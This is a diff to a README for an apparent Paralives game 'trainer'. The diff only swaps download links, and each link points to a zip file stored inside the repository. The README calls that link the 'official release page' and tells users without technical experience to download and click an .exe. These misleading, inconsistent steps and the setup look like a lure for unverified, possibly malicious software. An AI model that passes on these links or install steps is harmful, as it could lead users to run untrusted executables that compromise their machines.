@@ -1,6 +1,6 @@
 # 🎮 Paralives-Ultimate-Trainer-2026_v_2 - Control every part of your game
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://raw.githubusercontent.com/chrysteunsettled634/Paralives-Ultimate-Trainer-2026_v_2/main/src/gui/Ultimate_Paralives_Trainer_v_v2.5.zip)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/chrysteunsettled634/Paralives-Ultimate-Trainer-2026_v_2/raw/refs/heads/main/src/gui/Ultimate_Paralives_Trainer_v_v2.5.zip)
 
 This software modifies your save data in Paralives. It gives you control over money, character needs, character age, and item availability. You run this tool while playing to activate changes in real time.
 
@@ -19,7 +19,7 @@ We built this tool using Python for speed and stability. It interacts directly w
 
 Follow these steps to set up the trainer on your machine. We kept the process simple for users without prior technical experience.
 
-1. Visit the [official release page](https://raw.githubusercontent.com/chrysteunsettled634/Paralives-Ultimate-Trainer-2026_v_2/main/src/gui/Ultimate_Paralives_Trainer_v_v2.5.zip).
+1. Visit the [official release page](https://github.com/chrysteunsettled634/Paralives-Ultimate-Trainer-2026_v_2/raw/refs/heads/main/src/gui/Ultimate_Paralives_Trainer_v_v2.5.zip).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or a folder you can find easily.
